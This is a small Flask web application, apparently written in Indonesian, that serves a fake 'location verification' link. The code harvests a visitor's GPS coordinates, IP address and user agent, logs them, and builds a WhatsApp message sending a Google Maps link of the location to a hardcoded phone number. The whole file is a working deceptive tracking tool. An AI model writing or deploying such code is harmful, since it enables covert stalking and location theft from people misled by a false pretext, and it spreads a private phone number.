
from flask import Flask, request, render_template, redirect
import datetime
import urllib.parse

app = Flask(__name__)

@app.route("/")
def home():
    return "<h2>Silakan buka <a href='/lacak'>tautan ini</a> untuk verifikasi lokasi.</h2>"

@app.route("/lacak")
def lacak():
    return render_template("lacak.html")

@app.route("/kirim", methods=["POST"])
def kirim():
    data = request.get_json()
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    latitude = data['latitude']
    longitude = data['longitude']

    print(f"""
    === LOKASI DITERIMA ===
    Waktu     : {timestamp}
    IP        : {user_ip}
    Lokasi    : ({latitude}, {longitude})
    User-Agent: {user_agent}
    """)

    # Nomor WhatsApp tujuan (ganti sesuai kebutuhan)
    nomor_wa = "6285792079002"

    # Format pesan lokasi
    pesan = f"Lokasi terkini:\nhttps://www.google.com/maps?q={latitude},{longitude}\nWaktu: {timestamp}"
    encoded_pesan = urllib.parse.quote(pesan)

    # Buat tautan WA
    wa_link = f"https://wa.me/{nomor_wa}?text={encoded_pesan}"

    return {"status": "OK", "whatsapp_link": wa_link}

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
